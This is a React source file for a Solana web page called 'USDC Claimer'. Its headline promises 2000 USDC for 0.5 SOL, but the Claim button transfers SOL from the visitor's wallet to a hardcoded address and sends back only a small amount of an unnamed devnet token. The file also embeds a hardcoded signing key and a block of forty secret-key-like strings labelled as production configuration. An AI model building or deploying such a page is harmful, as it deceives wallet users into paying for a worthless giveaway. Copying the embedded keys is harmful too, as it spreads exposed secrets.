/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4iXJyyzrxKuYdyP74kUyjbSPvNWQhy2ajiXYeZPgMTWLrSWy6XXNahRthJJkeGWeH5EeJPSWr88ahsw38FUHDzb"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3XNhb2MqW7spH2mfzYqdxNwNedtH3ym4js3AF9Hr1Bj757FswJdELT9jVA5RncThxTg1xVgr85uXn4MeFdKyoRjx",
  "key1": "PXdHtc8bLCtfQZStXysSskP2pq5DGvVSfPLWRsseUdYndxJNHmbD5YmwSE1WqpS1zacJ7pYrHmcPEqFvcWTcvZZ",
  "key2": "3V5cvg7rURC6Tcp8RsmVHaX9efUCr7XD8C8b6Adj1r9x4MdqHzc5GNpcz51CY6eej9YqZEPrNMg4oiJKkAYq6Suh",
  "key3": "2oR7hQtRfSbQncLZn9asLSnB3DL15aGwrjgBVKXceF2QZTqEubcdBNKSMS1Fn7nT5E6WreDMGbbppS6n7PAeBE6r",
  "key4": "2dH9UjLnLAiKMmKYRv9AVcuav4Qdaz5njAVBJodzsVfEDsNRBbdizin9BnKpK4rQc7fa8PCnw8YX6cAnCqgeGWaz",
  "key5": "5xbbdK3JdrMdQA7ZMo2iRK78cCycbdtzdAM4F5qTVLT5ZauT9PJ65A42ES7KhoNxAFZEJo4qZeUvqsmjEc1bYhD9",
  "key6": "4yPu8jGocZhJw4V8fKcyvNiWWf8jYcQqGKc7T2Y4dtc43XfzejjNEJ36Khe2LGoC2jHvWqpKfrgs2ZoxQSFkb4ro",
  "key7": "2xcLZzzi9ks3eeCxfX7ZxsawWWePnFkPySGF2eJz1e1Pp4u3DRqqDz2fFnRfB79dMYvL1vU5UTAdRjpqFwCgzKEY",
  "key8": "4NLu6gRrW8UyV4JHyKYojiY6Q4g3RaCbcAqc9KU48V5XoGMDUiZn2V1sD9W3Pk6W1tyAak3c8sMEZPbB9ALLp1r4",
  "key9": "3H54Gjabaz2isEwgqh84iagQhLGMvB8NFqgCxCvdrXUj9QqtHsyJwLsLR3hqDgCkEggAPvVjKkNKzRLmwuGhHuNi",
  "key10": "4zqG9PXc722qGEMYcgPeQBjkb5NMsrmGSyuAizxdKuZ44YYHqGLESykmQhii7mtnQiivwLAQXA8suuyVB46ANEJb",
  "key11": "4StUVUSLhWqhPDaMbCKbN8BNW37TC7fRWVJXwEYNB8ruvkM2a18XVdVQC6CrrpqxvtZCSY9DgW9joo9js1ewD1TH",
  "key12": "5zyLd8KLo8JqbEd7SXpFSDpJH61XJU4vFhbXzQJrekrbHw279DLy2fHzjzgcwurnyzxU1iMCn8uQUwbt3chj8WGN",
  "key13": "3brdQjpnXvSg2zmjVVZKopA77DVhgf3LmbWXqDhARHHtP2TerXD4JeN5sFHKJrVLzerHjPZN1Z4jHmDbZ9Dj6itZ",
  "key14": "2eXh87cYz1v1Hycm5Scnm37TK9dem7dvzjn96S1YeCnNifXE2gf72dtmGFHuDgCFbk5zbBv5CFMwvpjA43EiAZGf",
  "key15": "3Lon5FNfoBhY8q3Gd3c8ANS4PyksRRZGcH4QMbmCopP6JMX6nqmVCZzbJstcocViDPWSZU3BVmksmEgmDNo8xw5w",
  "key16": "2jdmmxXWGZGiqumNaHoquUJXQSzdaNKses4N5Cif98XLW2QNTZJLcr2iyadDku8BPugRXSNK1VDEUwPJFGLZrLuW",
  "key17": "2CKt8463dQQHdWLwVCegZWcqRfq1iPu8LLgagaHzzMM1DBRqK2MMd1uji9BNMDFwkJAenWBMNEmW5THTXzxeX4aa",
  "key18": "2nQxaRkuwVfYFqzF2hHacpTr3YJsB6zQM6Y9o2GyLgq1RC5uHGukfV6Q8TMYJpzenUxJD3BuDva7bmq49NjmHC1W",
  "key19": "Kyupe9QiUxcLHwHLB1ezNnSM8P6T4PoWHF9psZsMT8u5m5CtF5BpDiPeV1FRu5HR4CKJZnErd9ydVm3DJqr4j1k",
  "key20": "3BWcWC7YZpa8fFdtiZND2hThQgm8PRJ4CRZ9t5EP7E1HVgUPynRJjxxZE4BfMxwNkfNpSL89P1KzGkqgCq7EWhTd",
  "key21": "3bGiVs2GmctA2wnuD2vHr4B8manfqdN26Q6vwkAbE36gzgRRoQpPBQrRkx5gsGxDf4P8tnb9iat6YB2r33sQhbpb",
  "key22": "3iKDf1GitrbVaK2jiDEmHZJzANCyr9S94Umb2WMbLfP1PZW5XL3hd33ugXDdzKSaGV7vksvVCBeS3UipT6M86QbX",
  "key23": "CnwS9vgNCmQCSeRYMnAbajBegzYS4YG8eRKngVPNkJ23JKTxNsCXzraD1RPJ4stp8JMUgFVcDxAMmg4hHmKNyXN",
  "key24": "emsLyQKY9Z4qU8PhxKQXWFdTMxxdEPZUDDmfEQNfkBCjQTDuThPjEhpxWPfQQ3D975j7cE5D54nSMQs4r5U9E5w",
  "key25": "DtkjvG6xCEhBM7rPSabWNc7dViAn7NY6Zc2nae9yL6dUaUSwAQiGp3iwRfWYBAhr9NJvaTakXDBY3k51D5uQvVa",
  "key26": "65EQAhCaL9jUgzMiTfygGqhBouUSwHAT8mNFKFZyarYPApZ3Kn2DNWpsr7DECzDVN96yKy7zZGsCUSDz9Pe79t5f",
  "key27": "45bXM3ucsErGiLpHcfJdcMAE6U74Brmpw62pdu5Zpc6ReULxV5iabCAp5kEwF88kJXBvmqzgvzSNThKTxPkJSyMk",
  "key28": "3doxCorMMWDF2SQwAcnkU35uvSVfL6cggR91TZnowKVodxHwTdzFqrDQ6CtBCjdfrHqZ1Uv3ZNgxEHwTwJ46Rs1f",
  "key29": "fM6kqQNf9y5MTtRJQhHXbEuRF1qNGUpvp7gF66ZHaRnrGDv2QHfP5MnShzZdiB72yatihE8CeS9ak5mGffxBhVv",
  "key30": "4RvnR3K4nEscngcaRRWyUrRZ3b8LM5z1s5rcF6sFxUeQ2C2Hy8DxHFzze6xuJztTUvKwvucTXin8qrHBJMcuBbVv",
  "key31": "2tZNSGFr8wHyZ4UZKUGzto35uPQHERbtAgadxjyvDPuZ62pokGocCnsxobGgVN4dHzYu4cnn1yP2CrQcT757dZo5",
  "key32": "YBLa6BQUEBC75s47up5saDYW9DhtpJ6vsBLtN9i58mm8VRpSMCNu8gt9arTB4cU1RJ1tVjNxkfmRSaZ8RbK1yAp",
  "key33": "3PCHEWy9CoPsikj2Ydxx9gZ4aUVLsVtEvChkZXhhcwJpCAmBMvvXuabrLzzG6UYUqRXRRmpT4ormSCvLTe1HusET",
  "key34": "2dgSHPjEAKA8kNDwVswPr8n5PJNJnwvmDmZ5brfs4d7UMWQnDDxh6tR7pyJPd5r5TarhNTLbLdeH5BxQei65MTTJ",
  "key35": "26CR6CoZrXjM1WoxgNiMMfKNA3SoPm2c735PjB4wuV48YspdWWSgUBJSnFJWa17A21S1tNFmzZwup3BgmvXM7XVe",
  "key36": "VKYf6PZMm1f8WR8wPD4c9cH3Pg5mZGDXh4AJ1DzNLh46qsYCyM2SJmMN9MeDPrgWYiz1AEAU88GQASWmcREYBDp",
  "key37": "2JySgrqXmVhWLc2pdtTP6WKidnU2mc6CotUZSCHLfsH7BcdfHo9pvFY9FNiFumLb7mhBVBWm3aTsPmUARoJaZm7r",
  "key38": "3X4MkjdcqQWrQotvVNG5EACfSYRS34V59h85pwsAFuU8yiC5s6WvAEohkdhi32oJb9p7zbdkVzT4XVewyd3v1N1Q",
  "key39": "2kYWkaSeC673jY6t2CVBv127L4sZRpj2Kwk6JBPbg2jmzVvCDLzxAeupzvTXMJfDVmxitG9YVjSeNaL543jd94jD"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
